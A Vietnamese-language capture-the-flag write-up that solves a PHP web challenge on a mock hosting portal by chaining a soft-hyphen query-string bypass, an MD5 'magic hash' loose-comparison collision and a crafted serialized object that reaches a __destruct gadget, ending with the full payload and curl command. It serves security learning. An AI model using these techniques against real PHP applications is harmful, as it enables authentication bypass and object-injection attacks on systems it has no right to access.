# PHP-2003

Trang web là trang "BRUNNERNE HOSTING" gồm một cái form để ta điền, có các id **staff_pin** và **reservation_export**

```PHP

<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Brunnerne Hosting · Customer Area</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
<table class="shell" role="presentation">
    <tr><td class="titlebar">BRUNNERNE HOSTING</td></tr>
    <tr><td class="nav">Home  |  Customers  |  Webmail  |  Support</td></tr>
    <tr><td class="content">
        <div class="panel">
            <div class="panel-title">Reservation import</div>
            <p class="intro">The original booking system is no longer in service. Staff can restore a customer reservation from an exported booking file.</p>
            <form method="post">
                <label>Staff recovery code</label>
                <input name="staff_pin" autocomplete="off">

                <label>Reservation export</label>
                <textarea name="reservation_export" rows="7" spellcheck="false"></textarea>

                <button type="submit">Import reservation</button>
            </form>
                                </div>
    </td></tr>
    <tr><td class="footer">Brunnerne Hosting ApS · Customer services · Portal build 2003.11</td></tr>
</table>
</body>
</html>
```

Mình check xem thư mục `/robots.txt` :

```Shell
lehuuhoang@LAPTOP-R3PSV0S9:~$ curl https://php-2003-338dcbe56f4ab417-global.challs.brunnerne.xyz/robots.txt
User-agent: *
Disallow: /cgi-bin/
Disallow: /stats/
Disallow: /webmail/
Disallow: /private/
Disallow: /index.phps
```

Ta truy cập được **/index.phps**:

```PHP
<?php
declare(strict_types=1);

const ACCESS_CODE_HASH = '0e769468064680399918991535722650';

final class Voucher
{
    public function __toString(): string
    {
        return getenv('WEBHOTEL_LICENSE_KEY') ?: 'brunner{REDACTED}';
    }
}

final class Receipt
{
    public bool $flushOnShutdown = false;
    public mixed $voucher = null;

    public function __destruct()
    {
        if ($this->flushOnShutdown && $this->voucher instanceof Voucher) {
            $flag = htmlspecialchars((string) $this->voucher, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
            echo '<div class="result flag">' . $flag . '</div>';
        }
    }
}

final class Booking
{
    public string $user = '';
    public string $role = 'guest';
    public mixed $receipt = null;
}

function legacy_cgi_request(): bool
{
    $raw = $_SERVER['QUERY_STRING'] ?? '';
    $decoded = urldecode($raw);

    if (str_contains($decoded, '-')) {
        return false;
    }

    $normalized = str_replace("\u{00AD}", '-', $decoded);
    return trim($normalized) === '-d webhotel.legacy=1';
}

function first_serialized_string(string $serialized, string $property): ?string
{
    $name = preg_quote($property, '/');
    $pattern = '/s:' . strlen($property) . ':"' . $name . '";s:(\d+):"(.*?)";/s';

    if (!preg_match($pattern, $serialized, $match)) {
        return null;
    }

    return strlen($match[2]) === (int) $match[1] ? $match[2] : null;
}

$message = '';
$messageClass = 'error';
$destroyBooking = null;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $staffPin = (string) ($_POST['staff_pin'] ?? '');
    $encodedReservation = (string) ($_POST['reservation_export'] ?? '');
    $reservation = base64_decode($encodedReservation, true);

    if (!legacy_cgi_request()) {
        $message = 'The reservation service is unavailable.';
    } elseif (md5($staffPin) != ACCESS_CODE_HASH) {
        $message = 'Recovery code rejected.';
    } elseif ($reservation === false) {
        $message = 'Reservation export rejected.';
    } elseif (first_serialized_string($reservation, 'role') !== 'guest') {
        $message = 'Only customer reservations can be imported.';
    } else {
        $booking = @unserialize($reservation, [
            'allowed_classes' => [Booking::class, Receipt::class, Voucher::class],
        ]);

        if (!$booking instanceof Booking) {
            $message = 'Reservation export could not be read.';
        } elseif ($booking->role !== 'admin') {
            $message = 'A staff reservation is required.';
        } elseif (!$booking->receipt instanceof Receipt) {
            $message = 'Receipt missing from reservation export.';
        } else {
            $booking->receipt->flushOnShutdown = true;
            $destroyBooking = $booking;
            $message = 'Reservation imported.';
            $messageClass = 'ok';
        }
    }
}
?>
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Brunnerne Hosting · Customer Area</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
<table class="shell" role="presentation">
    <tr><td class="titlebar">BRUNNERNE HOSTING</td></tr>
    <tr><td class="nav">Home  |  Customers  |  Webmail  |  Support</td></tr>
    <tr><td class="content">
        <div class="panel">
            <div class="panel-title">Reservation import</div>
            <p class="intro">The original booking system is no longer in service. Staff can restore a customer reservation from an exported booking file.</p>
            <form method="post">
                <label>Staff recovery code</label>
                <input name="staff_pin" autocomplete="off">

                <label>Reservation export</label>
                <textarea name="reservation_export" rows="7" spellcheck="false"></textarea>

                <button type="submit">Import reservation</button>
            </form>
            <?php if ($message !== ''): ?>
                <div class="result <?= $messageClass ?>"><?= htmlspecialchars($message, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') ?></div>
            <?php endif; ?>
            <?php
            if ($destroyBooking !== null) {
                unset($destroyBooking);
                unset($booking);
            }
            ?>
        </div>
    </td></tr>
    <tr><td class="footer">Brunnerne Hosting ApS · Customer services · Portal build 2003.11</td></tr>
</table>
</body>
</html>
```

Để lấy được flag thì ta cần gọi được hàm `destruct` của class Receipt, nó yêu cầu biến **flushOnShutdown** True và có object **Voucher**

```
final class Receipt
{
    public bool $flushOnShutdown = false;
    public mixed $voucher = null;

    public function __destruct()
    {
        if ($this->flushOnShutdown && $this->voucher instanceof Voucher) {
            $flag = htmlspecialchars((string) $this->voucher, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
            echo '<div class="result flag">' . $flag . '</div>';
        }
    }
}
```

Mình chú ý vào đoạn code logic trước rồi mới đọc các hàm:

```JavaScript
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $staffPin = (string) ($_POST['staff_pin'] ?? '');
    $encodedReservation = (string) ($_POST['reservation_export'] ?? '');
    $reservation = base64_decode($encodedReservation, true);

    if (!legacy_cgi_request()) {
        $message = 'The reservation service is unavailable.';
    } elseif (md5($staffPin) != ACCESS_CODE_HASH) {
        $message = 'Recovery code rejected.';
    } elseif ($reservation === false) {
        $message = 'Reservation export rejected.';
    } elseif (first_serialized_string($reservation, 'role') !== 'guest') {
        $message = 'Only customer reservations can be imported.';
    } else {
        $booking = @unserialize($reservation, [
            'allowed_classes' => [Booking::class, Receipt::class, Voucher::class],
        ]);

        if (!$booking instanceof Booking) {
            $message = 'Reservation export could not be read.';
        } elseif ($booking->role !== 'admin') {
            $message = 'A staff reservation is required.';
        } elseif (!$booking->receipt instanceof Receipt) {
            $message = 'Receipt missing from reservation export.';
        } else {
            $booking->receipt->flushOnShutdown = true;
            $destroyBooking = $booking;
            $message = 'Reservation imported.';
            $messageClass = 'ok';
        }
    }
}
```

Đầu tiên  nó lấy 2 biến từ POST và bắt đầu kiểm tra:

#### 1. legacy_cgi_request():

```JavaScript
function legacy_cgi_request(): bool
{
    $raw = $_SERVER['QUERY_STRING'] ?? '';
    $decoded = urldecode($raw);

    if (str_contains($decoded, '-')) {
        return false;
    }

    $normalized = str_replace("\u{00AD}", '-', $decoded);
    return trim($normalized) === '-d webhotel.legacy=1';
}
```

Hàm này yêu cầu query_string là `-d webhotel.legacy=1` nhưng không được có dấu `-` xuất hiện:

```JavaScript
if (str_contains($decoded, '-')) {
        return false;
    }
```

Sau đó nó thay thế [soft hyphen]([unicode-explorer.com/c/00AD](https://unicode-explorer.com/c/00AD)) `\u{00AD}` thành `-`. Do đó để bypass bước này thì mình sẽ gửi request dạng `?%C2%ADd%20webhotel.legacy%3D1`

#### 2. md5($staffPin) == ACCESS_CODE_HASH

Trong PHP, ``0e769468064680399918991535722650`` được xem như là float 0, vì thế ta chỉ cần điền PIN sao cho hash của nó có dạng **0e....** là được, ví dụ `240610708` (collison phổ biến)

#### 3. first_serialized_string

```JavaScript
function first_serialized_string(string $serialized, string $property): ?string
{
    $name = preg_quote($property, '/');
    $pattern = '/s:' . strlen($property) . ':"' . $name . '";s:(\d+):"(.*?)";/s';

    if (!preg_match($pattern, $serialized, $match)) {
        return null;
    }

    return strlen($match[2]) === (int) $match[1] ? $match[2] : null;
}
```

Hàm này lấy giá trị của đối property trong chuỗi serialize. Ở đây bài toán yêu cầu một số thành phần như sau:

- role ban đầu là guest
- có object Booking
- role sau là admin (ta có thể xử lí được bình thường vì giá trị ở sau sẽ ghi đè giá trị phía trước, vì thế khi check tuần tự thì ta bypass được)
- Trong object Booking có object Receipt:
  - Ta không cần set True cho **flushOnShutdown** vì code sẽ tự đặt: `$booking->receipt->flushOnShutdown = true;`
  - Thêm object Voucher(để thỏa điều kiện in flag)

Vì thế payload cuối cùng là:

```JavaScript
O:7:"Booking":4:{s:4:"user";s:0:"";s:4:"role";s:5:"guest";s:4:"role";s:5:"admin";s:7:"receipt";O:7:"Receipt":1:{s:7:"voucher";O:7:"Voucher":0:{}}}
```

Vậy là ta đã hoàn thành bài toán:

```Shell
curl -s -X POST "https://php-2003-338dcbe56f4ab417-global.challs.brunnerne.xyz/?%C2%ADd%20webhotel.legacy=1" --data-urlencode "staff_pin=240610708" --data-urlencode  "reservation_export=Tzo3OiJCb29raW5nIjo0OntzOjQ6InVzZXIiO3M6MDoiIjtzOjQ6InJvbGUiO3M6NToiZ3Vlc3QiO3M6NDoicm9sZSI7czo1OiJhZG1pbiI7czo3OiJyZWNlaXB0IjtPOjc6IlJlY2VpcHQiOjE6e3M6Nzoidm91Y2hlciI7Tzo3OiJWb3VjaGVyIjowOnt9fX0K"
```

> FLAG: brunner{php_was_a_web_framework_and_a_fever_dream}
